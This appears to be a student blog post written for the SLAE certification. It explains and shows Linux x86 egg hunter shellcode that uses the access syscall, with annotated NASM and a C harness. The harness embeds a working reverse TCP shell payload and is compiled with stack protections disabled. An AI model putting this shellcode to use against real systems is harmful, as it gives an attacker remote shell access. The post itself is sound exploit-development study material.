## Assignment 0x03: Create An Egg Hunter Shellcode
---
## Objectives
Create a Shell_Reverse_TCP shellcode that;
1. Create a working demo of the Egg Hunter
2. Egg Hunter should be configurable for different payloads

## Overview
In the classic stack buffer overflow scenario, execution flow can be redirected to a `JMP ESP` instruction which results in the execution of subsequent shellcode on the stack. Say that the goal is to execute a reverse shell shellcode that is 100 bytes in length. If there are at least 100 bytes worth of buffer space remaining after control of execution flow has been obtained (i.e. after the memory address to which a program should resume execution after a function has completed has been overwritten with a pointer to a `JMP ESP` instruction), then the shellcode will be stored and executed. If, however, there are less than 100 bytes worth of buffer space after control of execution flow has been obtained, then the reverse shell shellcode will not fit in the remaining available buffer space. This is where the "Egg Hunter" technique might come into play.

Imagine a scenario where a program called `chicken` is vulnerable to a stack-based buffer overflow attack. The function within the program that leads to the buffer overflow vulnerability is called `calcium` and takes two arguments; `egghunter` and `eggshell`. The `egghunter` argument can be abused to trigger the overflow vulnerability (i.e. the value of the memory address to which program flow should return upon completion of the `calcium` function can be overwritten using `egghunter` and control of the program can be obtained). After control of the program is gained through this vulnerability, there are only 50 bytes of space remaining in the buffer, so a 100 byte reverse shell shellcode would not fit. The `eggshell` argument of `calcium` cannot be used to trigger a buffer overflow vulnerability, however up to 200 bytes can be written to memory through this argument. Memory for the `egghunter` and `eggshell` arguments are allocated in distinct locations.

Through the functionality of `calcium` in the `chicken` program, a reverse shell shellcode less than 200 bytes in length could be written to memory through the `eggshell` argument and an egg hunter shellcode could be injected into memory and executed via the stack buffer overflow caused by the `egghunter` argument. 

As part of the reverse shell shellcode written to memory via the `eggshell` argument, the shellcode would be prepended by a key. This key is commonly referred to as an "Egg", and is often times 8 bytes in length when implemented in the context of a 32-bit system or process. The 8 byte value that is chosen for the egg is highly unlikely to show up anywhere else in memory by random chance. This means that the shellcode along with the unique egg can be written to memory, however the memory location of this shellcode within virtual address space is unknown.

Using the 50 bytes of buffer space remaining after program control has been obtained via the stack buffer overlow vulnerability caused by the `eggshell` argument, an "Egg Hunter" shellcode would injected and excuted. The egg hunter shellcode would search virtual address space for the unique egg value. Once the the location of the egg is found, a `JMP` instruction can be used to execute the reverse shell shellcode following the egg.

There is a wealth of information available on the subject, and as such, the demo explained below is based primarily off of the work of Matt Miller. Particularly, the majority of the shellcode outlined below is described in his paper, _Safely Searching Process Virtual Address Space_ which can be found here [[[LINK TO http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf]]]. The egg hunter shellcode analysis by FuzzySecurity was also a valuable source of information regarding egg hunter techniques, however the analysis is focused heavily on Windows rather than on Linux. The egg hunter shellcode explanation and analysis from FuzzySecurity can be found here [[[LINK TO https://www.fuzzysecurity.com/tutorials/expDev/4.html]]].

The rest of this post will aim to explain, analyze, and demonstrate an egg hunter shellcode inspired by the work of Matt Miller.

## Egg Hunter Shellcode: Explanation
The egg hunter shellcode that will be explained in this section utilizes the `access` system call to search virtual address space for the egg value. The system call number for `access` is decimal `33` which can be determined from the `unistd_32.h` file explained in previous posts. 

```
#define __NR_access 33
```

From `man access`, the `access` function checks whether the calling process can access a filename as specified by a pointer to its location in memory. While `access` expects two arguments, the egg hunter program functionality is provided by and relies only on the first argument. The two arguments expected by `access` are shown below.

```shell
int access(const char *pathname, int mode);
```

If the pointer to the pathname given as argument one points to an area of inaccessible or invalid memory, the `EFAULT` error is returned, as detailed below in `man access`.

```shell
EFAULT pathname points outside your accessible address space.
```

This is crucial to the egg hunter shellcode, as the return value of the `access` systemcall can be examined upon completion to determine whether the egg could possibly be located in the page of memory that includes the specified pointer address. If the `access` system call returns `EFAULT`, then the egg and the subsequent reverse shell shellcode is not located in the page of memory. When `EFAULT` is returned, `access` is used again to validate a memory address in the next page of memory.

As the egg hunter shellcode does its work, `access` attempts to access a valid memory page which is determined by the absense of the `EFAULT` value returned in `EAX`. When a valid memory page is found, the shellcode continues by first increasing the memory address by one, and then by comparing the egg value specfied within the egg hunter shellcode to the egg value prepended to the target reverse shell shellcode. That is to say, once a valid memory address is found, the value of the valid memory address is increased by one until either the entire range of memory within the page has been searched without the 8 byte egg being found, or until the 8 byte egg value is found as prepended to the reverse shell shellcode. If the egg is found within the page, the egg hunter shellcode jumps to the reverse shell shellcode. Otherwise, the process of locating another valid memory address (on a different page of memory) through the `access` system call is repeated.

The comparision functionality of the egg hunter shellcode is provided by the string comparison instruction `SCASD`. The `SCASD` instruction compares the value in `EAX` (which will be the first 4 bytes of the egg) to the doubleword at `EDI`. In this egg hunter shellcode, a valid memory address as determined by `access` as outlined above will be the target for comparison and will be stored in `EDI` for this purpose. Additionaly, `SCASD` increases the value stored in `EDI` by 4 upon completion and sets status flags which can be used to determine the outcome of the comparison.

Through the general processes explained above, the egg will eventually be found in memory and the reverse shell shellcode immediately following the egg will be executed.

## Egg Hunter Shellcode: Analysis
```nasm
xor edx, edx        ; clear EDX
```

```nasm
align_page:
or dx, 0xfff        ; sets EDX to FFF; e.g. 0x00000fff, 0x00001fff

inc_address:
inc edx             ; increases EDX by one; e.g. 0x0001000, 0x0002000
```

```nasm
; preparation for SYS_access
; int access(const char *pathname, int mode);
lea ebx, [edx+0x4]  ; pathname
push byte 0x21      ; system call number for access
pop eax             ; 0x21
int 0x80            ; software interrupt; returns 0xfffffff2 on EFAULT
```

```nasm
; compare return value of SYS_access to find writable page
cmp al, 0xf2        ; sets ZF when comparison is true
jz align_page       ; jumps to align_page when ZF is set
```

```nasm
; prepares for egg hunt
mov eax, 0x50905090 ; 4-byte egghunter key
mov edi, edx        ; EDX contains memory address of writable page
```

```nasm
; hunts for first 4 bytes of egg; scasd sets ZF when match is true
scasd               ; compares [EDI] to value in EAX; increments EDI by 4 
jnz inc_address     ; jumps to inc_address when ZF is not set
```

```nasm
; hunts for last 4 bytes of egg
scasd               ; hunts for last 4 bytes of egg
jnz inc_address
```

```nasm
; jumps to beginning of shellcode
jmp edi
```

## Egg Hunter Shellcode: Full Code

```nasm
; egghunter.nasm
; Author: Michael Norris
; Credit: Matt Miller

global _start

section .text
_start:
    xor edx, edx        ; clear EDX

align_page:
    or dx, 0xfff        ; sets EDX to FFF; e.g. 0x00000fff, 0x00001fff

inc_address:
    inc edx             ; increases EDX by one; e.g. 0x0001000, 0x0002000

    ; preparation for SYS_access
    ; int access(const char *pathname, int mode);
    lea ebx, [edx+0x4]  ; pathname
    push byte 0x21      ; system call number for access
    pop eax             ; 0x21
    int 0x80            ; software interrupt; returns 0xfffffff2 on EFAULT

    ; compare return value of SYS_access to find writable page
    cmp al, 0xf2        ; sets ZF when comparison is true
    jz align_page       ; jumps to align_page when ZF is set

    ; prepares for egg hunt
    mov eax, 0x50905090 ; 4-byte egghunter key
    mov edi, edx        ; EDX contains memory address of writable page
    
    ; hunts for first 4 bytes of egg; scasd sets ZF when match is true
    scasd               ; compares [EDI] to value in EAX; increments EDI by 4 
    jnz inc_address     ; jumps to inc_address when ZF is not set
    
    ; hunts for last 4 bytes of egg
    scasd               ; hunts for last 4 bytes of egg
    jnz inc_address

    ; jumps to beginning of shellcode
    jmp edi
```

## Egg Hunter Shellcode: Demonstration
```c
#include <stdio.h>
#include <string.h>

/*
To compile:
gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
*/

unsigned char egghunter[] = \ 
    "\x31\xd2\x66\x81\xca\xff\x0f\x42"
    "\x8d\x5a\x04\x6a\x21\x58\xcd\x80"
    "\x3c\xf2\x74\xee\xb8\x90\x50\x90"
    "\x50\x89\xd7\xaf\x75\xe9\xaf\x75"
    "\xe6\xff\xe7";

unsigned char shellcode[] = \ 
    /* Egg */
    "\x90\x50\x90\x50\x90\x50\x90\x50"
    /* Insert any other payload below */
    /* Current payload: Reverse Shell TCP */
    "\x31\xdb\xf7\xe3\x52\x6a\x01\x6a"
    "\x02\x89\xe1\xfe\xc3\xb0\x66\xcd"
    "\x80\x89\xc3\xbf\xff\xff\xff\xff"
    "\xb9\x80\xff\xff\xfe\x31\xf9\x51"
    "\x66\x68\x11\x5c\x66\x6a\x02\x89"
    "\xe1\x6a\x10\x51\x53\x89\xe1\xb0"
    "\x66\xcd\x80\x89\xd1\xb0\x3f\xcd"
    "\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe"
    "\xc1\xb0\x3f\xcd\x80\x52\x68\x2f"
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    "\x89\xd1\x89\xe3\xb0\x0b\xcd\x80";

int main(void)
{   
    printf("Egghunter Length: %d\n", strlen(egghunter));
    printf("Shellcode Length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())egghunter;
    ret();
}
```

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_
---
[Home](https://norrismw.github.io/SLAE)
